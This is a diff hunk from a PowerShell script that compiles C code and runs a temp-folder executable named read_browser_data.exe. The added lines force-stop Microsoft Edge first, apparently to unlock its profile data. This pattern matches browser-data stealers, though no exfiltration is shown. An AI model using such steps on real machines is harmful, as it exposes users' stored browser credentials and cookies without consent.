@@ -158,6 +158,12 @@ Write-Output "Compiling the C code..."
 
 Write-Output "Compilation completed successfully!"
 
+# Stop Edge process and wait until it ends
+Write-Output "Stopping Edge process..."
+Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
+Write-Output "Waiting for Edge process to exit..."
+Wait-Process -Name "msedge" -ErrorAction SilentlyContinue
+
 # Execute the compiled executable
 Write-Output "Executing the compiled program..."
 & "$env:TEMP\read_browser_data.exe"
